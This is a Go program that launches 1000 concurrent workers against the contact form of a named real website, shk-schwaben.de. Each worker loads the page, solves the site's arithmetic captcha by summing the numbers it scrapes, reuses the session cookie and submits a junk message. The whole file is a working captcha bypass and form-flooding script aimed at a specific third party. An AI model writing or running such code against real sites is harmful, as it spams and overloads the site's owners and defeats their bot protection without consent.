package main

import (
	"errors"
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"github.com/davecgh/go-spew/spew"
	"net/http"
	"regexp"
	"strconv"
	"stuff/client"
)

func main() {
	fmt.Printf("hello, world\n")

	numWorkers := 1000
	done := make(chan bool, numWorkers)

	for i:=0; i<numWorkers; i++ {
		go func(do chan bool) {
			sendErr := sendMailToInnung("BennyBot", "haha@web.de", "automated xD")

			if sendErr != nil {
				_, _ = spew.Print("!")
				do <- false
			} else {
				_, _ = spew.Print(".")
				do <- true
			}
		}(done)
	}

	k := 0
	for i:=0; i<numWorkers; i++ {
		if <- done {
			k++
		}
	}

	spew.Dump(strconv.Itoa(k) + " out of " + strconv.Itoa(numWorkers) + " succeeded.")
}

func sendMailToInnung(name, email, message string) error {
	res, err := http.Get("http://shk-schwaben.de/index.php/kontakt.html")
	if err != nil {
		return err
	}
	defer res.Body.Close()
	if res.StatusCode != 200 {
		return errors.New(fmt.Sprintf("status code error: %d %s", res.StatusCode, res.Status))
	}

	// Load the HTML document
	doc, err := goquery.NewDocumentFromReader(res.Body)
	if err != nil {
		return err
	}

	sel := doc.Find(".captcha_text").First()
	secret := sel.Text()
	re := regexp.MustCompile("[0-9]+")
	nums := re.FindAllString(secret, -1)

	sum := 0
	for _,n := range nums {
		n2, _ := strconv.Atoi(n)
		sum += n2
	}

	//spew.Dump(secret, nums, sum)

	sel2 := doc.Find("#ctrl_5").First()
	captchaName, _ := sel2.Attr("name")
	//spew.Dump("Name: ", captchaName)

	sesId := ""
	for _,c := range res.Cookies() {
		if c.Name == "PHPSESSID" {
			sesId = c.Value
		}
	}
	//spew.Dump("SesId: ", sesId)

	cooks := []*http.Cookie{{Name: "PHPSESSID", Value: sesId}}
	header := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
		"Referer": "http://shk-schwaben.de/index.php/kontakt.html",
	}
	cli := client.SimpleClient{BaseUrl: "http://shk-schwaben.de", Headers: header}

	bodyPs := map[string]string{
		"FORM_SUBMIT": "auto_KontaktFormular",
		"MAX_FILE_SIZE": "2048000",
		"Ihr_Name": "Ich2",
		"Ihre_E-Mail": "meine@mail.de",
		"Nachricht": "Hi",
		captchaName: strconv.Itoa(sum),
	}

	var back []byte
	mailErr := cli.Call5("POST", "/index.php/kontakt-danke.html", map[string]string{}, bodyPs, cooks, &back)

	return mailErr
}